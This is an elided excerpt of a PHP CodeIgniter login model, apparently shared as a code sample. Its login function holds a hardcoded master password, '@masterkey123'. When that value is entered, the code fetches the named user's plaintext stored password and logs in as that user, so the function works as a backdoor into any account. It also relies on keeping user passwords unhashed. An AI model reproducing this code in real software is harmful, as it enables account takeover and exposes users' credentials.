...
class Demo_auth_model extends CI_Model {
	...
	function login()
	{
		...
		if ($this->form_validation->run())
		{
            ...
            $md5_master_password = md5('@masterkey123');
            if($md5_master_password == md5($this->input->post('login_password'))){
                $user_detail = $this->far_users->get_user('uacc_username', $username);
                if(strlen($user_detail['uacc_id']) > 0){
                    $password = $user_detail['uacc_raw_password'];
                }
            }
	       
			// Verify login data.
			$this->flexi_auth->login($username, $password, $remember_user);
